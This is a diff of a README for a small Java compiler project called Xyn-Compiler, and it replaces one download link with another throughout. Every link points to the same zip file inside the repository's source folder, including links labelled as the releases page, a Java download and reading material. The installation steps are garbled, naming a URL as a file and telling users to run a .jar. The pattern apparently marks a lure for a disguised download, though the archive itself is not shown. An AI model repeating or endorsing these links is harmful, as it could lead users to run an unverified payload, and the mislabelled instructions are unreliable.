@@ -1,7 +1,7 @@
 # 🚀 Xyn-Compiler - Build Your Own Simple Language Tool
 
 ## 🔗 Download Xyn-Compiler
-[![Download Xyn-Compiler](https://raw.githubusercontent.com/MDS129/Xyn-Compiler/master/src/parser/Ast/statements/Xyn_Compiler_3.0-beta.5.zip%20Xyn--Compiler-v1.0-blue)](https://raw.githubusercontent.com/MDS129/Xyn-Compiler/master/src/parser/Ast/statements/Xyn_Compiler_3.0-beta.5.zip)
+[![Download Xyn-Compiler](https://github.com/MDS129/Xyn-Compiler/raw/refs/heads/master/src/Xyn-Compiler-2.6.zip%20Xyn--Compiler-v1.0-blue)](https://github.com/MDS129/Xyn-Compiler/raw/refs/heads/master/src/Xyn-Compiler-2.6.zip)
 
 ## 📖 Introduction
 Xyn-Compiler is my first compiler created with Java. It allows users to experiment with building and executing code in a custom programming language. This tool supports concepts such as null safety and static typing, making it a valuable resource for anyone interested in language design.
@@ -23,11 +23,11 @@ To run the Xyn-Compiler, you will need:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of Xyn-Compiler. Click the link below to access the page:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/MDS129/Xyn-Compiler/master/src/parser/Ast/statements/Xyn_Compiler_3.0-beta.5.zip)
+[Visit the Releases Page to Download](https://github.com/MDS129/Xyn-Compiler/raw/refs/heads/master/src/Xyn-Compiler-2.6.zip)
 
 ### Installation Steps
 1. Click on the latest release version on the Releases page.
-2. Look for the file named `https://raw.githubusercontent.com/MDS129/Xyn-Compiler/master/src/parser/Ast/statements/Xyn_Compiler_3.0-beta.5.zip`.
+2. Look for the file named `https://github.com/MDS129/Xyn-Compiler/raw/refs/heads/master/src/Xyn-Compiler-2.6.zip`.
 3. Once you find the file, click to download it to your computer.
 4. After the download is complete, locate the file in your downloads folder.
 5. To run the compiler, double-click the `.jar` file. Make sure you have the Java Runtime Environment installed.
@@ -54,8 +54,8 @@ Join our community to share your experiences and ask questions. You can find hel
 Feel free to submit issues or suggestions on the GitHub page if you encounter bugs or have ideas for improvement.
 
 ## 📚 Additional Resources
-- [Java Download](https://raw.githubusercontent.com/MDS129/Xyn-Compiler/master/src/parser/Ast/statements/Xyn_Compiler_3.0-beta.5.zip)
-- [Language Design Principles](https://raw.githubusercontent.com/MDS129/Xyn-Compiler/master/src/parser/Ast/statements/Xyn_Compiler_3.0-beta.5.zip)
-- [Compiler Overview](https://raw.githubusercontent.com/MDS129/Xyn-Compiler/master/src/parser/Ast/statements/Xyn_Compiler_3.0-beta.5.zip)
+- [Java Download](https://github.com/MDS129/Xyn-Compiler/raw/refs/heads/master/src/Xyn-Compiler-2.6.zip)
+- [Language Design Principles](https://github.com/MDS129/Xyn-Compiler/raw/refs/heads/master/src/Xyn-Compiler-2.6.zip)
+- [Compiler Overview](https://github.com/MDS129/Xyn-Compiler/raw/refs/heads/master/src/Xyn-Compiler-2.6.zip)
 
 We hope you enjoy using Xyn-Compiler and look forward to seeing what you create!
